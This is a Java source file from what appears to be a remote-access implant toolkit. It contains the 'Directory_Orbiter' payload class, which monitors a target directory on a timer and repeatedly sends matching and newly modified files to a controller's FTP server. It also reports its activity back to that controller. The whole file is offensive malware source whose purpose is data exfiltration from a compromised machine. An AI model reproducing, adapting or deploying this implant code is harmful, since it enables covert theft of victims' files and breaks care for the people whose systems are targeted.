/**
 * This class automates data exfiltration
 * 
 * @author Solomon Sonya
 */

package Implant.Payloads;


import Controller.GUI.*;
import Controller.Thread.Thread_Terminal;
import Controller.Drivers.Drivers;
import GeoLocation.GeoThread;
import GeoLocation.ShowMap;
import Implant.Driver;
import Implant.ProcessHandlerThread;
import Implant.Splinter_IMPLANT;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import RunningProcess.*;
import java.io.*;

import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;
import javax.swing.*;
import javax.swing.Timer;
import java.awt.*;
import java.awt.event.*;
public class Directory_Orbiter extends Thread implements Runnable, ActionListener
{
	public static final String strMyClassName = "Directory_Orbiter";
	
	File fleOrbitDirectory = null;
	String strFileType = "*.*";
	boolean recurseSubDirectories = false;
	int millisecInterruptDelayInterval = 1000;
	String FTP_Address = "";
	int FTP_Port = 21;
	
	private boolean engageOrbiter = true;
	
	Timer tmrInterrupt = null;
	
	boolean continueInterrupt = true;
	
	boolean dismissInterrupt = false;
	
	Splinter_IMPLANT implant = null;
	
	ArrayList<File> alOrbitDirectoryListing = new ArrayList<File>();
	ArrayList<String> alOrbitDirectoryLastMoodifiedEntries = new ArrayList<String>();
	
	public Directory_Orbiter(File orbitDir, String fileType, boolean recurseSubFolders, int milliSecDelay, String controllerAddress, int controllerPort, Splinter_IMPLANT implant_ok_to_be_null)
	{
		fleOrbitDirectory = orbitDir;
		strFileType = fileType;
		recurseSubDirectories = recurseSubFolders;
		millisecInterruptDelayInterval = milliSecDelay;
		FTP_Address = controllerAddress;
		FTP_Port = controllerPort;
		implant = implant_ok_to_be_null;
		
		//normalize
		if(strFileType == null || strFileType.trim().equals(""))
		{
			strFileType = "*.*";
		}
		
		if(millisecInterruptDelayInterval == -2)
		{
			engageOrbiter = false;
		}
		
		else if(millisecInterruptDelayInterval < 1000)
		{
			millisecInterruptDelayInterval = Driver.ORBIT_DIRECTORY_DELAY_MILLIS;
		}
		
		//ensure we have valid parameters
		if(fleOrbitDirectory == null || !fleOrbitDirectory.exists() || strFileType == null || FTP_Address == null || FTP_Port < 1 || FTP_Port > 65535)
		{
			continueInterrupt = false;
		}
	}
	
	public void run()
	{
		try
		{
			if(continueInterrupt)
			{
				//Assume all data is correct
				String notification = "Commencing Orbiter Payload" + " Location: " + fleOrbitDirectory.getCanonicalPath() + Driver.fileSeperator + strFileType + " Delay: " + millisecInterruptDelayInterval/1000 + " secs " + " Recursively including Sub-directories in data extraction: " + recurseSubDirectories + " FTP Repository: " + FTP_Address + ":" + FTP_Port;				
				
				if(!this.engageOrbiter)
				{
					notification = "Commencing Extraction Payload" + " Location: " + fleOrbitDirectory.getCanonicalPath() + Driver.fileSeperator + strFileType + " Recursively including Sub-directories in data extraction: " + recurseSubDirectories + " FTP Repository: " + FTP_Address + ":" + FTP_Port;
					
					Driver.sop(notification);
					this.sendToController(notification);
					
					//extract the files!
					ExfiltrateFilesUnderDirectory.scanAndExfiltrateFiles(fleOrbitDirectory, strFileType, recurseSubDirectories, alOrbitDirectoryListing, null, implant, this.FTP_Address, this.FTP_Port, this.engageOrbiter);
				}
				
				else//engage orbiter!
				{
					Driver.sop(notification);
					this.sendToController(notification);
					
					this.tmrInterrupt = new Timer(this.millisecInterruptDelayInterval, this);
					tmrInterrupt.start();
				}
				
				
			}
		}
		catch(Exception e)
		{
			Driver.eop("run", strMyClassName, e, e.getLocalizedMessage(), false);
			continueInterrupt = false;
		}
	}
	
	
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrInterrupt)
			{
				if(!this.continueInterrupt)
				{
					String kill = "Orbiter Kill command received.... killing this thread softly...";
					this.sendToController(kill);
					
					try
					{
						this.tmrInterrupt.stop();
					}catch(Exception e){}
				}
				
				if(!this.dismissInterrupt)
				{
					dismissInterrupt = true;
					
					//process the interrupt
					alOrbitDirectoryListing = ExfiltrateFilesUnderDirectory.scanAndExfiltrateFiles(fleOrbitDirectory, strFileType, recurseSubDirectories, alOrbitDirectoryListing, alOrbitDirectoryLastMoodifiedEntries, implant, this.FTP_Address, this.FTP_Port, this.engageOrbiter);
					
					//keep the new entries
					if(alOrbitDirectoryListing != null)
					{
						alOrbitDirectoryLastMoodifiedEntries.clear();
						
						for(int i = 0; i < alOrbitDirectoryListing.size(); i++)
						{
							alOrbitDirectoryLastMoodifiedEntries.add(""+alOrbitDirectoryListing.get(i).lastModified());
						}
					}
					
					//if we every get a null, that means the directory has been deleted
					if(alOrbitDirectoryListing == null)
					{
						Driver.sop("Directory is no longer valid... I will continue to orbit incase it is re-created again or until user issues termination command\n");
					}
					
					dismissInterrupt = false;
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	
	public boolean sendToController(String strToSend)
	{
		try
		{
			if(implant != null)
			{
				implant.sendToController(strToSend, false, false);				
			}
						
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendToController", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
}





	
	